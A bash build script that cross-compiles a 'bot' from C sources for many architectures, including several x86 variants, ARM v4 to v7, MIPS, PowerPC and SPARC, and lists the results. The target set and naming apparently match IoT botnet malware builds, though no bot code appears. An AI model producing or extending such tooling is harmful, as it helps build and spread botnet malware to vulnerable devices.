#!/bin/bash
echo "Rebuilding all architectures with correct secret..."
echo "===================================================="

# x86_64
echo -n "Building x86_64... "
gcc -o binaries/bot_x86_64 bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

# 32-bit x86
echo -n "Building i486... "
gcc -m32 -o binaries/bot_i486 bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building i586... "
gcc -m32 -o binaries/bot_i586 bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building i686... "
i686-linux-gnu-gcc -o binaries/bot_i686 bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

# ARM
echo -n "Building armv4l... "
arm-linux-gnueabi-gcc -o binaries/bot_armv4l bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building armv5l... "
arm-linux-gnueabi-gcc -o binaries/bot_armv5l bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building armv6l... "
arm-linux-gnueabi-gcc -o binaries/bot_armv6l bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building armv7l... "
arm-linux-gnueabihf-gcc -o binaries/bot_armv7l bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

# MIPS
echo -n "Building mips... "
mips-linux-gnu-gcc -o binaries/bot_mips bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"
echo -n "Building mipsel... "
mipsel-linux-gnu-gcc -o binaries/bot_mipsel bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

# PowerPC
echo -n "Building powerpc... "
powerpc-linux-gnu-gcc -o binaries/bot_powerpc bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

# SPARC
echo -n "Building sparc... "
sparc64-linux-gnu-gcc -o binaries/bot_sparc bot/*.c -Wall -O2 2>/dev/null && echo "✅" || echo "❌"

echo "===================================================="
echo "Rebuild complete! Binaries:"
ls -lh binaries/bot_* | grep -v test
